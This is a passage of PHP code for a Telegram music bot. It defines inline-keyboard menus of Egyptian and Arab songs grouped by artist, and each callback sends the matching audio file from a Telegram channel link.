 audio =>"https://t.me/mahmoumagdx/672",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/673",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/674",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/675",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/676",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/677",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/678",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd9"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/679",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd10"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/680",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd11"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/681",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd12"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/682",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="okaworti" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني اوكا واورتيجا 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 لغه العيون','callback_data'=>"okaworti1"],['text'=>' 🎧 واحده عملتلي عمل','callback_data'=>"okaworti2"]],
[['text'=>'🎧 دلع بنات ','callback_data'=>"okaworti3"],['text'=>' 🎧 العب يلا','callback_data'=>"okaworti4"]],
[['text'=>'🎧 1991 ','callback_data'=>"okaworti5"],['text'=>'🎧 امتي','callback_data'=>"okaworti6"]],
[['text'=>'🎧 طب ليه كده','callback_data'=>"okaworti7"],['text'=>'🎧 هنولع','callback_data'=>"okaworti8"]],
[['text'=>'🎧 نوزهي','callback_data'=>"okaworti9"],['text'=>'🎧 سوري ','callback_data'=>"okaworti10"]],
[['text'=>'🎧 فامبير','callback_data'=>"okaworti11"],['text'=>'🎧 دوس بنزين ','callback_data'=>"okaworti12"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}


if($data=="okaworti1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/659",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/660",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/661",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/662",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/663",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/664",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/665",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/666",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti9"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/667",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti10"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/668",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti11"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/669",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="okaworti12"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/670",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mikoo" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني احمد مكي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'قطر الحياه 🎧','callback_data'=>"mikoo1"],['text'=>'اخره الشقاوه🎧','callback_data'=>"mikoo2"]],
[['text'=>'ايام زمان🎧','callback_data'=>"mikoo3"],['text'=>'طرقت بابك 🎧','callback_data'=>"mikoo4"]],
[['text'=>'وقفه ناصيه زمان🎧','callback_data'=>"mikoo5"],['text'=>'الحاسه السابعه 🎧','callback_data'=>"mikoo6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="mikoo1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/653",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mikoo2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/654",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mikoo3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/655",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mikoo4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/656",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mikoo5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/657",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mikoo6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/658",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="karoki" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني كاريوكي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'يا ابيض يا اسود 🎧','callback_data'=>"karoki1"],['text'=>'كان لك معايا🎧','callback_data'=>"karoki2"]],
[['text'=>'الكيف🎧','callback_data'=>"karoki3"],['text'=>'السكه شمال في شمال 🎧','callback_data'=>"karoki4"]],
[['text'=>'الديناصور🎧','callback_data'=>"karoki5"],['text'=>'هاتلنا بالباقي لبان 🎧','callback_data'=>"karoki6"]],
[['text'=>'انا السجاره 🎧','callback_data'=>"karoki7"],['text'=>'نقطه بيضا 🎧','callback_data'=>"karoki8"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="karoki1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/643",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="karoki2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/644",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="karoki3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/645",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="karoki4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/648",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="karoki5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/649",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="karoki6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/650",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="karoki7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/651",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="karoki8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/652",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="shrmof" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني شارموفرز 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'سنجل 🎧','callback_data'=>"shrmof1"],['text'=>'خمسه سنتي🎧','callback_data'=>"shrmof2"]],
[['text'=>'زومبي🎧','callback_data'=>"shrmof3"],['text'=>'انفصام 🎧','callback_data'=>"shrmof4"]],
[['text'=>'ايزي موني🎧','callback_data'=>"shrmof5"],['text'=>'خلاص هسيطر 🎧','callback_data'=>"shrmof6"]],
[['text'=>'زامبا 🎧','callback_data'=>"shrmof7"],['text'=>'مفتقد الحبيبه 🎧','callback_data'=>"shrmof8"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="shrmof1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/635",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shrmof2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/636",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shrmof3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/637",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shrmof4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/638",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shrmof5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/639",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shrmof6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/640",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shrmof7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/642",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shrmof8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/641",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني مسلم 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'يا صحبه ورا الستاره 🎧','callback_data'=>"muslim1"],['text'=>'بتوع مصالح🎧','callback_data'=>"muslim2"]],
[['text'=>'قلبي عايز صرمه🎧','callback_data'=>"muslim3"],['text'=>'مولود كبير 🎧','callback_data'=>"muslim4"]],
[['text'=>'اضربت بكيف وخمره🎧','callback_data'=>"muslim5"],['text'=>'اربع حيطان 🎧','callback_data'=>"muslim6"]],
[['text'=>'حرب وحوش 🎧','callback_data'=>"muslim7"],['text'=>'هضرب عيار 🎧','callback_data'=>"muslim8"]],
[['text'=>'الاسم دبابه 🎧','callback_data'=>"muslim9"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}


if($data=="muslim1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/194",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/195",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/196",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/197",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/198",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/199",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/200",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/201",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="muslim9"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/202",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني ابيوسف 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 سيستم','callback_data'=>"abyo1"],['text'=>' 🎧 مونشاكو','callback_data'=>"abyo2"]],
[['text'=>'🎧 نا نا نا','callback_data'=>"abyo3"],['text'=>' 🎧 فوقني','callback_data'=>"abyo4"]],
[['text'=>'🎧 باشا اعتمد','callback_data'=>"abyo5"],['text'=>'🎧 استلم يا هيثم','callback_data'=>"abyo6"]],
[['text'=>'🎧 انترو','callback_data'=>"abyo7"],['text'=>'🎧 كان ف دماغي','callback_data'=>"abyo8"]],
[['text'=>'🎧 عظمه','callback_data'=>"abyo9"],['text'=>'🎧 نافثلين','callback_data'=>"abyo10"]],
[['text'=>'🎧 عمر','callback_data'=>"abyo11"],['text'=>'🎧 انا مش هقدر حد','callback_data'=>"abyo12"]],
[['text'=>'🎧 عزرائيل ','callback_data'=>"abyo13"],['text'=>'🎧 ثانوس','callback_data'=>"abyo14"]],
[['text'=>'🎧 ولا مسا','callback_data'=>"abyo15"],['text'=>'🎧 محدش له عندي حاجه','callback_data'=>"abyo16"]],
[['text'=>'🎧 مورتال كومبات','callback_data'=>"abyo17"],['text'=>'🎧 يوم الاتنين','callback_data'=>"abyo18"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="abyo1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/481",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}



if($data=="abyo2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/482",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/483",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/484",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/485",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/486",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/487",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/488",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo9"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/489",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="abyo12"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/490",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="abyo10"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/491",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="abyo11"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/492",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="abyo13"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/493",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="abyo14"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/494",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="abyo16"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/495",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="abyo17"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/496",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="abyo15"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/497",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="abyo18"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/498",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه المهرجانات 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'عملت بلوك 🎧','callback_data'=>"mahrgan1"],['text'=>'ابطال ومشتهم مرا 🎧','callback_data'=>"mahrgan2"]],
[['text'=>'كرهت الناس 🎧','callback_data'=>"mahrgan3"],['text'=>'ندمانه 🎧','callback_data'=>"mahrgan4"]],
[['text'=>'يلا اكشن 🎧','callback_data'=>"mahrgan5"],['text'=>'في القرايب 🎧','callback_data'=>"mahrgan6"]],
[['text'=>'قلبي ميت 🎧','callback_data'=>"mahrgan7"],['text'=>'اخواتي 🎧','callback_data'=>"mahrgan8"]],
[['text'=>'خاينه وبايعه 🎧','callback_data'=>"mahrgan9"],['text'=>'بركان فجر 🎧','callback_data'=>"mahrgan10"]],
[['text'=>'مع السلامه 🎧','callback_data'=>"mahrgan11"],['text'=>'وقت عوزه 🎧','callback_data'=>"mahrgan12"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="mahrgan1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/259",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/260",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/261",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/262",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/263",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/264",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/265",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/266",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan9"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/267",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="mahrgan12"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/269",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mahrgan11"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/268",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mahrgan10"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/270",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني اصالة 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 جيتني مكسور','callback_data'=>"asala1"],['text'=>' 🎧 اتحبني','callback_data'=>"asala2"]],
[['text'=>'🎧 جابو سيرته','callback_data'=>"asala3"],['text'=>' 🎧 ذاك الغبي','callback_data'=>"asala4"]],
[['text'=>'🎧 بنت اكابر','callback_data'=>"asala5"],['text'=>'🎧 60 دقيقه','callback_data'=>"asala6"]],
[['text'=>'🎧 لا تخاف','callback_data'=>"asala7"],['text'=>'🎧 عقوبه','callback_data'=>"asala8"]],
[['text'=>'🎧 كبير الشوق','callback_data'=>"asala9"],['text'=>'🎧 شامخ','callback_data'=>"asala10"]],
[['text'=>'🎧 اكثر','callback_data'=>"asala11"],['text'=>'🎧 كان يهمني','callback_data'=>"asala12"]],
[['text'=>'🎧 مبقاش انا ','callback_data'=>"asala13"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="asala1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/365",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/366",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/367",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/368",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/369",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/370",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/371",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/372",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/373",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="asala10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/374",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

